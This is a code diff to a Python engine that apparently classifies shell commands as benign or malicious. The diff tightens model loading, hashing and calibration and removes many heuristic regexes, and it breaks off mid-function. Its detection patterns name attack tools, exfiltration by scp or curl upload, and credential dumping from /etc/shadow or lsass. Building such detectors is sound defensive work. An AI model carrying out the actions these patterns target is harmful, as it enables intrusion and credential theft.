@@ -4,13 +4,18 @@ import json
 import math
 import os
 import re
+import warnings
+import hashlib
+from importlib.metadata import version as package_version
+
+from scientific_validation import PREPROCESSING_VERSION, sha256_file, temperature_scale
 
 import joblib
 import torch
 import torch.nn as nn
 import torch.nn.functional as F
 from torch.amp import autocast
-from transformers import RobertaModel, RobertaTokenizer
+from transformers import RobertaConfig, RobertaModel, RobertaTokenizer
 
 try:
     import pyminusone
@@ -22,12 +27,6 @@ def _env_flag(name: str, default: bool) -> bool:
     return os.getenv(name, "1" if default else "0").strip().lower() in {"1", "true", "yes", "on"}
 
 
-benign_conf_threshold = float(os.getenv("GENOS_BENIGN_CONF_THRESHOLD", "0.52"))
-suspicious_conf_threshold = float(os.getenv("GENOS_SUSPICIOUS_CONF_THRESHOLD", "0.55"))
-malicious_conf_threshold = float(os.getenv("GENOS_MALICIOUS_CONF_THRESHOLD", "0.78"))
-low_margin_threshold = float(os.getenv("GENOS_LOW_MARGIN_THRESHOLD", "0.12"))
-high_risk_override_enabled = _env_flag("GENOS_HIGH_RISK_OVERRIDE_ENABLED", True)
-suspicious_fallback_enabled = _env_flag("GENOS_SUSPICIOUS_FALLBACK_ENABLED", True)
 
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -71,29 +70,14 @@ def _resolve_asset_path(path_value: str, fallback_relpaths: list[str] | None = N
 
 
 def _resolve_behavior_model_path(primary_path: str | None = None) -> str:
-    """Prefer a behavior-encoder checkpoint over legacy Tier-2 specialist files."""
-    candidates = []
-    if primary_path:
-        candidates.append(primary_path)
-    candidates.append("models/behavior_encoder.pt")
-
-    for candidate in candidates:
-        resolved = _resolve_asset_path(candidate)
-        if not os.path.exists(resolved):
-            continue
-        meta_candidate = os.path.splitext(resolved)[0] + ".json"
-        if os.path.basename(resolved).startswith("behavior_") or os.path.exists(meta_candidate):
-            return resolved
-
-    if primary_path:
-        return _resolve_asset_path(primary_path, ["models/behavior_encoder.pt"])
-    return _resolve_asset_path("models/behavior_encoder.pt")
+    """Resolve exactly the requested checkpoint; never silently substitute one."""
+    return _resolve_asset_path(primary_path or "models/behavior_encoder.pt")
 
 
 class Tier1_Gatekeeper(nn.Module):
     def __init__(self, num_classes=3):
         super().__init__()
-        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base", use_safetensors=True)
+        self.encoder = RobertaModel(RobertaConfig.from_pretrained("microsoft/codebert-base"))
         self.classifier = nn.Sequential(
             nn.Dropout(0.2),
             nn.Linear(768, 1024),
@@ -127,7 +111,7 @@ class _MeanPool(nn.Module):
 class Tier2_Specialist(nn.Module):
     def __init__(self, num_classes):
         super().__init__()
-        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base", use_safetensors=True)
+        self.encoder = RobertaModel(RobertaConfig.from_pretrained("microsoft/codebert-base"))
         self.pool = _MeanPool()
         self.classifier = nn.Sequential(
             nn.Dropout(0.2),
@@ -147,7 +131,7 @@ class Tier2_Specialist(nn.Module):
 class BehaviorEncoderModel(nn.Module):
     def __init__(self, num_stages: int, num_actions: int):
         super().__init__()
-        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base", use_safetensors=True)
+        self.encoder = RobertaModel(RobertaConfig.from_pretrained("microsoft/codebert-base"))
         self.dropout = nn.Dropout(0.2)
         self.stage_head = nn.Linear(768, num_stages)
         self.action_head = nn.Linear(768, num_actions)
@@ -162,7 +146,7 @@ class GenosEngine:
     _PUBLIC_LABEL_MAP = {
         "Benign": "Benign",
         "Malicious": "Malicious",
-        "Context_Dependent": "Suspicious",
+        "Context_Dependent": "Context_Dependent",
     }
     _INTERNAL_LABEL_MAP = {value: key for key, value in _PUBLIC_LABEL_MAP.items()}
 
@@ -264,23 +248,6 @@ class GenosEngine:
         r")",
         re.I | re.M,
     )
-    _AGGRESSIVE_NMAP_RE = re.compile(
-        r"^\s*nmap\b.*(?:-sS\b|-sV\b.*--script|--script=vuln|-p-\b|-A\b|--script=exploit)",
-        re.I,
-    )
-    _POST_EXPLOIT_RE = re.compile(
-        r"(?:"
-        # TTY upgrade / pty spawn
-        r"\bpty\.spawn\b"
-        r"|"
-        # Known post-exploitation tools
-        r"^\s*(?:\.?/)?(?:linpeas(?:\.sh)?|winpeas|pspy\d*|linenum(?:\.sh)?)\b"
-        r"|"
-        # LD_PRELOAD library injection
-        r"\bLD_PRELOAD=\S+\.so\b"
-        r")",
-        re.I | re.M,
-    )
     _EXFIL_DATA_MOVEMENT_RE = re.compile(
         r"(?:"
         # curl POST with file data to non-standard targets
@@ -345,103 +312,33 @@ class GenosEngine:
         r"^\s*(?:scp|sftp|ftp|rsync)\b.*[@:][^ ]+|^\s*(?:curl|wget)\b.*(?:--upload-file|-T|--data-binary\s+@|--form\s+@|-d\s+@)",
         re.I,
     )
-    _SERVICE_INSPECTION_RE = re.compile(
-        r"^\s*(?:systemctl\s+(?:status|list-units|list-unit-files|is-active|is-enabled)|service\s+--status-all|"
-        r"journalctl\s+-u|docker\s+(?:ps|info|images)|kubectl\s+(?:get|describe|cluster-info|top)|"
-        r"(?:mount|lsblk|blkid|findmnt|df)\b)",
-        re.I,
-    )
-    _LOCAL_ARTIFACT_INSPECTION_RE = re.compile(
-        r"^\s*(?:md5sum|sha(?:1|224|256|384|512)?sum|file)\b.*(?:"
-        r"/(?:bin|usr/bin|sbin|usr/sbin|usr/local/bin|tmp|var/tmp|var/backups|srv/(?:builds|releases|artifacts|snapshots)|opt/(?:artifacts|builds)|home/[^\s]+/(?:downloads|builds))/|"
-        r"\.(?:tar(?:\.gz)?|tgz|zip|deb|rpm|asc|xml|pem|crt|log|txt|csv|bak)\b)",
-        re.I,
-    )
-    _BENIGN_SNAPSHOT_SOURCE_RE = re.compile(
-        r"(?:/var/log(?:/[^\s]*)?|/etc/(?:nginx|ssh|ssl/certs|systemd/system)|/srv/(?:app(?:/current|/config)?|releases)|"
-        r"/home/[^\s]+/(?:builds|\.config)|/tmp/(?:release|backup|snapshot|artifact)|/opt/(?:artifacts|builds))",
-        re.I,
-    )
-    _BENIGN_ARCHIVE_PATH_RE = re.compile(
-        r"^\s*(?:tar\s+(?:tzf|-xzf|czf)\b|zip\b)",
-        re.I,
-    )
-    _CONTROLLED_REMOTE_TARGET_RE = re.compile(
-        r"(?:\b(?:backup|audit|auth|ops|deploy|support|infra|dba|dbadmin)@(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.|[a-z0-9.-]*internal\b|[a-z0-9.-]*company\.local\b)|"
-        r":/srv/(?:backup|backups|audit|snapshots|incident|review|notes|staging|forensics|cert-audit|k8s-audit|ssh-baselines|rotated-ssh)[/\s])",
-        re.I,
-    )
-    _CONTROLLED_REMOTE_COPY_RE = re.compile(
-        r"^\s*(?:scp|rsync)\b",
-        re.I,
-    )
-    _OPENSSL_CLIENT_INSPECTION_RE = re.compile(
-        r"^\s*openssl\s+s_client\b(?!.*:(?:4444|5555|9001|1234)\b).*(?:-connect|-starttls|-servername|-showcerts)\b",
-        re.I,
-    )
-    _ROUTINE_SERVICE_LOG_RE = re.compile(
-        r"^\s*(?:journalctl\b|systemctl\s+(?:status|cat|reload|restart|daemon-reload)\b|docker\s+(?:logs|inspect|stats)\b|kubectl\s+(?:logs|describe|rollout|top|get\s+events)\b)",
-        re.I,
-    )
-    _CONTAINER_ADMIN_READONLY_RE = re.compile(
-        r"^\s*(?:docker\s+exec|kubectl\s+exec|kubectl\s+cp)\b(?!.*/var/run/secrets).*(?:"
-        r"\b(?:env|printenv|ls|find|cat)\b|/var/log|/etc/ssl|/app/config|\.log\b)",
-        re.I,
-    )
-    _SENSITIVE_SOURCE_RE = re.compile(
-        r"(?:/etc/(?:shadow|sudoers)|/root/\.ssh|authorized_keys\b|id_rsa\b|id_ed25519\b|/etc/kubernetes|/var/lib/kubelet|"
-        r"/opt/secrets|/var/lib/postgresql|/app/\.env|serviceaccount/token|/var/run/secrets|/etc/pam\.d)",
-        re.I,
-    )
     _EXPLOIT_OR_ATTACK_TOOLING_RE = re.compile(
         r"^\s*(?:hydra|sqlmap|nikto|msfconsole|mimikatz(?:\.exe)?|john\b|hashcat\b|responder\b|ettercap\b|arpspoof\b|"
         r"crackmapexec\b|impacket-|metasploit\b|secretsdump\b|mshta\b)",
-        re.I,
-    )
-    _BENIGN_ADMIN_WORKFLOW_RE = re.compile(
-        r"^(?:\s*(?:mount\b.*grep|ip\s+(?:addr|route|link|neigh)\b|ss\b|netstat\b|arp\b|route\b|ps\b|top\s+-b|du\b|ls\b|"
-        r"find\s+/(?:tmp|var/log|etc|opt|srv|usr/local/bin|home(?:/[^\s]+)?)\b.*(?:-maxdepth|-type|-mtime)|env\s*\|\s*grep\s+path|history\b|"
-        r"file\b|stat\b|head\b|wc\b|md5sum\b|sha(?:1|224|256|384|512)?sum\b|journalctl\b|systemctl\s+(?:status|is-active|is-enabled|"
-        r"reload|restart|cat|daemon-reload)\b|docker\s+(?:ps|logs|inspect|stats|exec)\b|kubectl\s+(?:get|logs|describe|rollout|cp|top)\b|"
-        r"pip\s+list\b|dpkg\s+-l\b|tar\s+(?:tzf|-xzf|czf)\b|zip\b|rsync\b|scp\b|curl\s+-f?s?S?L?\b.*(?:-o|>)|wget\b.*(?:-o|-O)\b|"
-        r"openssl\s+(?:x509|rsa|s_client)\b|python3?\s+-m\s+http\.server\b))",
         re.I,
     )
     _CREDENTIAL_DUMP_RE = re.compile(
         r"(?:/etc/shadow\b|mimikatz|sekurlsa|hashdump|lsass|sam hive|unshadow\b|john\b.*rockyou|secretsdump)",
         re.I,
     )
-    _SIMPLE_OPERATIONAL_BENIGN_PATTERNS = (
-        re.compile(r"^\s*(?:pwd|date|uptime|whoami|id(?:\s|$)|hostname(?:\s|$)|uname(?:\s|$)|echo\b|printf\b|true\b|false\b|alias\b)", re.I),
-        re.compile(r"^\s*(?:df|free|lsblk|blkid|findmnt)\b", re.I),
-        re.compile(r"^\s*cat\s+/(?:etc/(?:hostname|os-release|issue(?:\.net)?|debian_version|redhat-release)|proc/(?:version|cpuinfo|meminfo))\b", re.I),
-        re.compile(r"^\s*(?:git\s+log\b|docker\s+ps\b|systemctl\s+status\b|journalctl\s+-u\b)", re.I),
-        # Common read-only admin commands
-        re.compile(r"^\s*ls(?:\s+-[a-zA-Z]+)*\s*(?:/(?:tmp|var|etc|home|opt|srv|usr|proc|sys|mnt|media|boot|run)\b.*)?$", re.I),
-        re.compile(r"^\s*(?:ps(?:\s+(?:aux|ef|-ef|-aux))?|pstree|pgrep\b|pidof\b)\s*", re.I),
-        re.compile(r"^\s*(?:ip\s+(?:addr|route|link|neigh)\b|ifconfig(?:\s|$)|route(?:\s+-n)?\s*$)", re.I),
-        re.compile(r"^\s*(?:dig|nslookup|host)\b", re.I),
-        re.compile(r"^\s*(?:history|env|printenv|set|locale|who|w|last|users|groups|timedatectl|hostnamectl|lscpu|lsmem|lspci|lsusb)\b", re.I),
-        re.compile(r"^\s*(?:ss|netstat)(?:\s+-[a-zA-Z]+)*\s*$", re.I),
-        re.compile(r"^\s*(?:mount(?:\s|$)|lsof(?:\s|$)|vmstat|iostat|sar|dmesg|nproc)\b", re.I),
-        re.compile(r"^\s*(?:docker\s+(?:ps|images|info|version|stats)\b|kubectl\s+(?:get|describe|cluster-info|top|version)\b)", re.I),
-        re.compile(r"^\s*crontab\s+-l\b", re.I),
-        re.compile(r"^\s*(?:pip|pip3)\s+(?:list|show|freeze)\b", re.I),
-        re.compile(r"^\s*(?:dpkg\s+-l|rpm\s+-qa|apt\s+list|yum\s+list|brew\s+list)\b", re.I),
-        # Log inspection and mundane file operations
-        re.compile(r"^\s*(?:grep\b.*(?:/var/log|\.log\b)|tail\b.*(?:/var/log|\.log\b))", re.I),
-        re.compile(r"^\s*cp\s+/tmp/\S+\s+/home/", re.I),
-    )
     def __init__(
         self,
         t1_path="models/gatekeeper.pt",
-        t2_path="models/specialist_residual_a.pt",
+        t2_path="models/behavior_encoder.pt",
         map_path=None,
         raw_mitre_path="data/training/mitre_atlas_raw.csv",
         gatekeeper_meta_path=None,
         use_residual_format=True,
         prior_alphas=None,
+        view_policy=None,
+        allow_behavior_fallback=None,
     ):
+        self.view_policy = view_policy or os.getenv("GENOS_VIEW_POLICY", "mean")
+        if self.view_policy not in {"raw", "decoded", "mean"}:
+            raise ValueError("GENOS_VIEW_POLICY must be raw, decoded, or mean")
+        self.allow_behavior_fallback = (_env_flag("GENOS_ALLOW_BEHAVIOR_FALLBACK", False)
+                                        if allow_behavior_fallback is None else allow_behavior_fallback)
+        self.behavior_load_error = None
         self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
         self.tokenizer = RobertaTokenizer.from_pretrained("microsoft/codebert-base")
         self.max_length = int(os.getenv("GENOS_MAX_TOKENS", "256"))
@@ -449,13 +346,15 @@ class GenosEngine:
         self.gatekeeper_meta = {}
         self._gate_labels = list(self._GATE_LABELS)
 
-        t1_path = _resolve_asset_path(t1_path, ["models/gatekeeper.pt"])
-        t2_path = _resolve_asset_path(t2_path, ["models/specialist.pt"])
+        t1_path = _resolve_asset_path(t1_path)
+        t2_path = _resolve_asset_path(t2_path)
 
         # Prefer explicit specialist map JSON when provided (backward compatibility).
         map_candidates = ["config/specialist_map.json", "models/specialist_map.json"]
         if map_path:
-            map_candidates = [map_path] + map_candidates
+            map_candidates = [map_path]
+            if not os.path.exists(_resolve_asset_path(map_path)):
+                raise FileNotFoundError(map_path)
 
         resolved_map_path = None
         for candidate in map_candidates:
@@ -475,42 +374,35 @@ class GenosEngine:
             )
             self.s_map = self._build_map_from_csv(raw_csv_path)
 
-        meta_candidates = ["config/gatekeeper_meta.json"]
-        if gatekeeper_meta_path:
-            meta_candidates = [gatekeeper_meta_path] + meta_candidates
-
-        self.gatekeeper_threshold = None
-        self.gatekeeper_threshold_source = None
-        for candidate in meta_candidates:
-            resolved = _resolve_asset_path(candidate, ["config/gatekeeper_meta.json"])
-            if os.path.exists(resolved):
-                self.gatekeeper_meta = self._load_optional_json_dict(resolved)
-                self.gatekeeper_meta_path = resolved
-                gate_labels = self._load_gatekeeper_labels(self.gatekeeper_meta)
-                if gate_labels:
-                    self._gate_labels = gate_labels
-                threshold = self._load_gatekeeper_threshold(resolved)
-                if threshold is not None:
-                    self.gatekeeper_threshold = float(threshold)
-                    self.gatekeeper_threshold_source = resolved
-                    break
+        self.gatekeeper_meta_path = _resolve_asset_path(gatekeeper_meta_path or "config/gatekeeper_meta.json")
+        with open(self.gatekeeper_meta_path, encoding="utf-8") as handle:
+            self.gatekeeper_meta = json.load(handle)
+        self._gate_labels = self._load_gatekeeper_labels(self.gatekeeper_meta)
+        if self._gate_labels != self._GATE_LABELS:
+            raise ValueError("Gatekeeper metadata must declare Benign/Malicious/Context_Dependent in training order")
+        if int(self.gatekeeper_meta.get("max_len", self.max_length)) != self.max_length:
+            raise ValueError("Gatekeeper training/runtime token limits differ")
 
         self.t1 = Tier1_Gatekeeper().to(self.device)
-        self.t1.load_state_dict(torch.load(t1_path, map_location=self.device, weights_only=True), strict=False)
+        self.t1.load_state_dict(torch.load(t1_path, map_location=self.device, weights_only=True), strict=True)
         self.t1.eval()
-
-        # Tier-2 is now behavior-first. The trainable encoder is trained
-        # separately; runtime loads it when present and otherwise falls back
-        # to deterministic behavior staging.
+        expected_hash = self.gatekeeper_meta.get("checkpoint_sha256")
+        if expected_hash and expected_hash != sha256_file(t1_path):
+            raise ValueError("Gatekeeper checkpoint hash differs from metadata")
+        # Behavior inference is required; heuristic fallback requires an explicit flag.
         self.behavior_model_path = _resolve_behavior_model_path(t2_path)
         self.behavior_model = None
         self.behavior_stage_labels = {}
         self.behavior_action_labels = {}
         self.behavior_action_threshold = float(os.getenv("GENOS_BEHAVIOR_ACTION_THRESHOLD", "0.5"))
+        if not 0 <= self.behavior_action_threshold <= 1:
+            raise ValueError("Behavior action threshold must be in [0, 1]")
         self._load_behavior_model()
 
         self.max_deobfuscation_layers = 5
-        self.use_residual_format = use_residual_format and _RESIDUAL_PIPELINE_AVAILABLE
+        if not _RESIDUAL_PIPELINE_AVAILABLE:
+            raise RuntimeError("Required parser/residual pipeline is unavailable")
+        self.use_residual_format = use_residual_format
         self.prior_alphas = prior_alphas or {"strong": 2.0, "weak": 1.5, "none": 0.0}
         # Forward map {mitre_id: int_index} used by build_prior_vector
         self._specialist_map_fwd = {mitre: idx for idx, mitre in self.s_map.items()}
@@ -520,20 +412,92 @@ class GenosEngine:
             "GENOS_MITRE_MODEL_PATH", "models/specialist_tfidf_char_rf.pkl"
         ))
         self.t2 = joblib.load(mitre_model_path)
+        mitre_meta_path = os.path.splitext(mitre_model_path)[0] + ".json"
+        self.mitre_metadata = None
+        if os.path.exists(mitre_meta_path):
+            with open(mitre_meta_path, encoding="utf-8") as handle:
+                self.mitre_metadata = json.load(handle)
+            expected_format = "structured" if self.use_residual_format else "raw"
+            if self.mitre_metadata.get("input_format") != expected_format:
+                raise ValueError("MITRE training/runtime input formats differ")
+            if self.mitre_metadata.get("checkpoint_sha256") != sha256_file(mitre_model_path):
+                raise ValueError("MITRE checkpoint hash differs from metadata")
+            if {str(k): int(v) for k, v in self.mitre_metadata.get("label_map", {}).items()} != {v: k for k,v in self.s_map.items()}:
+                raise ValueError("MITRE checkpoint label map differs from runtime")
         self._tfidf_idx_to_label = dict(self.s_map)
         unknown_classes = {int(index) for index in self.t2.classes_} - self.s_map.keys()
         if unknown_classes:
             raise ValueError(f"MITRE classifier has unmapped class indices: {sorted(unknown_classes)}")
 
-    def _load_optional_json_dict(self, json_path: str) -> dict:
-        try:
-            with open(json_path, "r", encoding="utf-8") as f:
-                loaded = json.load(f)
-            if isinstance(loaded, dict):
-                return loaded
-        except Exception:
-            pass
-        return {}
+        self.provenance = {
+            "preprocessing_version": PREPROCESSING_VERSION,
+            "implementation_sha256": {name: sha256_file(os.path.join(BASE_DIR, name)) for name in (
+                "engine.py", "scientific_validation.py", "parser/parser.py", "parser/semantic_features.py",
+                "parser/rule_engine.py", "parser/build_residual_dataset.py")},
+            "view_policy": self.view_policy,
+            "max_length": self.max_length,
+            "gatekeeper_sha256": sha256_file(t1_path),
+            "gatekeeper_metadata_sha256": sha256_file(self.gatekeeper_meta_path) if self.gatekeeper_meta_path else None,
+            "mitre_sha256": sha256_file(mitre_model_path),
+            "mitre_metadata_status": "verified" if self.mitre_metadata else "legacy_missing_training_manifest",
+            "training_validity": "independent_annotation_not_established",
+            "mitre_label_map": self.s_map,
+            "mitre_input_format": "structured" if self.use_residual_format else "raw",
+            "behavior_sha256": sha256_file(self.behavior_model_path) if self.behavior_model is not None else None,
+            "behavior_input_format": getattr(self, "behavior_input_format", "structured"),
+            "behavior_metadata_sha256": sha256_file(os.path.splitext(self.behavior_model_path)[0] + ".json") if self.behavior_model is not None else None,
+            "behavior_action_threshold": self.behavior_action_threshold,
+            "torch_version": torch.__version__,
+            "package_versions": {name: package_version(name) for name in ("transformers", "scikit-learn", "numpy", "joblib")},
+            "encoder_config_sha256": hashlib.sha256(self.t1.encoder.config.to_json_string().encode()).hexdigest(),
+            "tokenizer_sha256": hashlib.sha256(self.tokenizer.backend_tokenizer.to_str().encode()).hexdigest(),
+            "deobfuscation_policy": {"entropy_threshold": 5.2, "entropy_delta_stop": 0.01, "max_layers": self.max_deobfuscation_layers},
+            "device_type": self.device.type,
+            "device_name": torch.cuda.get_device_name(self.device) if self.device.type == "cuda" else "cpu",
+            "cuda_runtime": torch.version.cuda,
+            "inference_autocast_dtype": "float16" if self.device.type == "cuda" else "bfloat16",
+            "behavior_model_type": "behavior_encoder" if self.behavior_model is not None else "heuristic_bootstrap",
+            "behavior_fallback_reason": self.behavior_load_error,
+            "optional_deobfuscator": "pyminusone" if pyminusone is not None else None,
+            "base_score_semantics": "uncalibrated_model_estimates",
+        }
+        self.behavior_action_thresholds = {}
+        policy_path = os.getenv("GENOS_BEHAVIOR_POLICY_PATH")
+        if policy_path:
+            with open(policy_path, encoding="utf-8") as handle:
+                policy = json.load(handle)
+            if policy.get("fit_split") != "validation" or policy.get("runtime_signature") != json.loads(json.dumps(self.provenance)):
+                raise ValueError("Behavior policy does not match runtime or validation provenance")
+            thresholds = policy.get("action_thresholds", {})
+            if set(thresholds) != set(self.behavior_action_labels.values()):
+                raise ValueError("Behavior policy action labels differ from checkpoint")
+            if any(not math.isfinite(float(v)) or not 0 <= float(v) <= 1 for v in thresholds.values()):
+                raise ValueError("Invalid behavior action threshold")
+            self.behavior_action_thresholds = {str(k): float(v) for k,v in thresholds.items()}
+            self.provenance["behavior_policy_sha256"] = sha256_file(policy_path)
+        self.calibration = None
+        calibration_path = os.getenv("GENOS_CALIBRATION_PATH")
+        if calibration_path:
+            with open(calibration_path, encoding="utf-8") as handle:
+                self.calibration = json.load(handle)
+            # Bind the artifact to the exact deployed models and preprocessing.
+            if self.calibration.get("runtime_signature") != json.loads(json.dumps(self.provenance)):
+                raise ValueError("Calibration artifact does not match runtime models/preprocessing")
+            if self.calibration.get("fit_split") != "validation":
+                raise ValueError("Calibration must be fitted on validation data")
+            if not isinstance(self.calibration.get("temperatures"), dict) or not self.calibration["temperatures"]:
+                raise ValueError("Calibration artifact must contain fitted temperatures")
+            for component, value in self.calibration["temperatures"].items():
+                if component not in {"gatekeeper", "mitre", "behavior"} or not math.isfinite(float(value)) or float(value) <= 0:
+                    raise ValueError("Invalid calibration temperature")
+
+    def _calibrate(self, probabilities, component):
+        if getattr(self, "calibration", None) and component in self.calibration.get("temperatures", {}):
+            return temperature_scale(probabilities, self.calibration["temperatures"][component])
+        return probabilities
+
+    def _score_status(self, component):
+        return "validation_temperature_scaled" if getattr(self, "calibration", None) and component in self.calibration.get("temperatures", {}) else "uncalibrated_model_estimate"
 
     def _load_gatekeeper_labels(self, meta: dict) -> list[str] | None:
         label_names = meta.get("label_names")
@@ -563,43 +527,39 @@ class GenosEngine:
         return None
 
     def _normalize_index_map(self, raw_map: dict) -> dict:
-        normalized = {}
-        for key, value in (raw_map or {}).items():
-            try:
-                normalized[str(key)] = int(value)
-            except (TypeError, ValueError):
-                continue
-        return normalized
+        if not isinstance(raw_map, dict) or any(type(v) is not int for v in raw_map.values()):
+            raise ValueError("Model label maps must map names to integer indices")
+        return {str(k): v for k, v in raw_map.items()}
 
     def _load_behavior_model(self) -> None:
-        if not os.path.exists(self.behavior_model_path):
-            return
-
-        meta_candidate = os.path.splitext(self.behavior_model_path)[0] + ".json"
-        meta = self._load_optional_json_dict(meta_candidate)
-        stage_map = self._normalize_index_map(meta.get("stage_map") or {})
-        action_map = self._normalize_index_map(meta.get("action_map") or {})
-
-        if not stage_map:
-            stage_map = self._normalize_index_map(
-                self._load_optional_json_dict(_resolve_asset_path("config/behavior_stage_map.json"))
-            )
-        if not action_map:
-            action_map = self._normalize_index_map(
-                self._load_optional_json_dict(_resolve_asset_path("config/behavior_action_map.json"))
-            )
-
-        if not stage_map or not action_map:
-            return
-
         try:
+            if not os.path.exists(self.behavior_model_path):
+                raise FileNotFoundError(self.behavior_model_path)
+            meta_candidate = os.path.splitext(self.behavior_model_path)[0] + ".json"
+            with open(meta_candidate, encoding="utf-8") as handle:
+                meta = json.load(handle)
+            stage_map = self._normalize_index_map(meta.get("stage_map") or {})
+            action_map = self._normalize_index_map(meta.get("action_map") or {})
+            for name, mapping in (("stage", stage_map), ("action", action_map)):
+                if not mapping or sorted(mapping.values()) != list(range(len(mapping))):
+                    raise ValueError(f"Behavior {name} map must have unique contiguous indices")
+            self.behavior_input_format = meta.get("input_format", "structured")
+            if self.behavior_input_format not in {"raw", "structured"}:
+                raise ValueError("Unsupported behavior input format")
+            if int(meta.get("max_length", self.max_length)) != self.max_length:
+                raise ValueError("Behavior training/runtime token limits differ")
+            if meta.get("checkpoint_sha256") and meta["checkpoint_sha256"] != sha256_file(self.behavior_model_path):
+                raise ValueError("Behavior checkpoint hash differs from metadata")
             model = BehaviorEncoderModel(len(stage_map), len(action_map)).to(self.device)
             state_dict = torch.load(self.behavior_model_path, map_location=self.device, weights_only=True)
             model.load_state_dict(state_dict, strict=True)
             model.eval()
-        except Exception:
+        except Exception as exc:
+            self.behavior_load_error = f"{type(exc).__name__}: {exc}"
+            if not self.allow_behavior_fallback:
+                raise RuntimeError("Behavior model failed to load; explicitly set GENOS_ALLOW_BEHAVIOR_FALLBACK=1 to allow the heuristic baseline") from exc
+            warnings.warn(f"Using heuristic behavior baseline: {self.behavior_load_error}", RuntimeWarning)
             return
-
         self.behavior_model = model
         self.behavior_stage_labels = {index: label for label, index in stage_map.items()}
         self.behavior_action_labels = {index: label for label, index in action_map.items()}
@@ -608,22 +568,10 @@ class GenosEngine:
         """Load specialist label map from JSON file as {int_index: mitre_id}."""
         with open(json_path, "r", encoding="utf-8") as f:
             raw_map = json.load(f)
-        return {int(v): k for k, v in raw_map.items()}
-
-    def _load_gatekeeper_threshold(self, json_path: str):
-        try:
-            with open(json_path, "r", encoding="utf-8") as f:
-                meta = json.load(f)
-        except Exception:
-            return None
-
-        if isinstance(meta, dict):
-            if "threshold" in meta:
-                return meta["threshold"]
-            for key in ("test_metrics", "val_metrics"):
-                if isinstance(meta.get(key), dict) and "threshold" in meta[key]:
-                    return meta[key]["threshold"]
-        return None
+        mapping = self._normalize_index_map(raw_map)
+        if sorted(mapping.values()) != list(range(len(mapping))):
+            raise ValueError("MITRE label map indices must be unique and contiguous")
+        return {v: k for k, v in mapping.items()}
 
     def _build_map_from_csv(self, csv_path: str) -> dict:
         """Reads the raw MITRE CSV, extracts unique IDs, sorts them, and maps them to ints."""
@@ -920,17 +868,27 @@ class GenosEngine:
         return self._build_evidence(parsed, sem, rules, was_obfuscated=was_obfuscated,
                                     deobfuscated_cmd=decoded_cmd if was_obfuscated else None)
 
-    def _predict_mitre_codes(self, raw_cmd: str, decoded_cmd: str | None = None) -> list[dict]:
-        """Rank the top five model predictions across raw and decoded views."""
+    def _mitre_distribution(self, raw_cmd: str, decoded_cmd: str | None = None):
         commands = list(dict.fromkeys(cmd for cmd in (raw_cmd, decoded_cmd) if cmd is not None))
         texts = [self._build_variant_a_text(cmd)[0] if self.use_residual_format else cmd for cmd in commands]
         probabilities = self.t2.predict_proba(texts)
-        ranked = [
-            (self._tfidf_idx_to_label[int(index)], max(float(row[column]) for row in probabilities))
-            for column, index in enumerate(self.t2.classes_)
-        ]
+        policy = getattr(self, "view_policy", "mean")
+        if policy == "raw":
+            probabilities = probabilities[:1]
+        elif policy == "decoded":
+            probabilities = probabilities[-1:]
+        pooled = [[sum(float(row[column]) for row in probabilities) / len(probabilities)
+                   for column in range(len(self.t2.classes_))]]
+        pooled = self._calibrate(pooled, "mitre")
+        return pooled[0]
+
+    def _predict_mitre_codes(self, raw_cmd: str, decoded_cmd: str | None = None) -> list[dict]:
+        """Rank normalized scores; these are candidate techniques, not proof of attack."""
+        pooled = self._mitre_distribution(raw_cmd, decoded_cmd)
+        ranked = [(self._tfidf_idx_to_label[int(index)], float(pooled[column]))
+                  for column, index in enumerate(self.t2.classes_)]
         ranked.sort(key=lambda item: (-item[1], item[0]))
-        return [{"code": code, "confidence": round(probability * 100, 2)} for code, probability in ranked[:5]]
+        return [{"code": code, "confidence": round(probability * 100, 2), "score_type": self._score_status("mitre")} for code, probability in ranked[:5]]
 
     def _extract_behavior_action_tags(self, sem: dict, rules: dict, features: dict) -> list[str]:
         tags = {
@@ -991,14 +949,23 @@ class GenosEngine:
             return "Execution"
         return "Context Required"
 
-    def _predict_behavior(self, cmd: str, routed_label: str, features: dict) -> tuple[dict, dict]:
+    def _predict_behavior(self, cmd: str, routed_label: str, features: dict, raw_cmd: str | None = None) -> tuple[dict, dict]:
         behavior_text, rule_result = self._build_behavior_input(cmd)
         parsed = _parse_command(cmd)
         sem = _build_semantic_features(parsed)
 
-        learned_behavior = self._predict_behavior_with_model(behavior_text)
+        commands = list(dict.fromkeys([raw_cmd or cmd, cmd]))
+        policy = getattr(self, "view_policy", "mean")
+        if policy == "raw":
+            commands = commands[:1]
+        elif policy == "decoded":
+            commands = commands[-1:]
+        texts = [view if getattr(self, "behavior_input_format", "structured") == "raw" else self._build_behavior_input(view)[0] for view in commands]
+        learned_behavior = self._predict_behavior_with_model(texts)
         if learned_behavior is not None:
-            learned_behavior["input_text"] = behavior_text
+            learned_behavior["input_text"] = texts[0]
+            learned_behavior["input_views"] = texts
+            learned_behavior["view_policy"] = policy
             return learned_behavior, rule_result
 
         stage = self._infer_behavior_stage(routed_label, sem, rule_result, features)
@@ -1012,7 +979,7 @@ class GenosEngine:
             "input_text": behavior_text,
         }, rule_result
 
-    def _predict_behavior_with_model(self, behavior_text: str) -> dict | None:
+    def _predict_behavior_with_model(self, behavior_text: str | list[str]) -> dict | None:
         if self.behavior_model is None:
             return None
 
@@ -1034,25 +1001,34 @@ class GenosEngine:
                     encoded["attention_mask"],
                 )
 
-        stage_probs = F.softmax(stage_logits, dim=1).squeeze(0)
-        action_probs = torch.sigmoid(action_logits).squeeze(0)
+        stage_probs = F.softmax(stage_logits.float(), dim=1).mean(dim=0)
+        action_probs = torch.sigmoid(action_logits.float()).mean(dim=0)
+        stage_probs = torch.as_tensor(self._calibrate(stage_probs.cpu().numpy()[None, :], "behavior")[0])
         stage_index = int(torch.argmax(stage_probs).item())
         stage_label = self.behavior_stage_labels.get(stage_index)
         if stage_label is None:
-            return None
+            raise RuntimeError("Behavior prediction has no matching stage label")
 
         action_tags = []
         for action_index, probability in enumerate(action_probs.tolist()):
-            if probability >= self.behavior_action_threshold:
-                action_label = self.behavior_action_labels.get(action_index)
-                if action_label:
-                    action_tags.append(action_label)
+            action_label = self.behavior_action_labels.get(action_index)
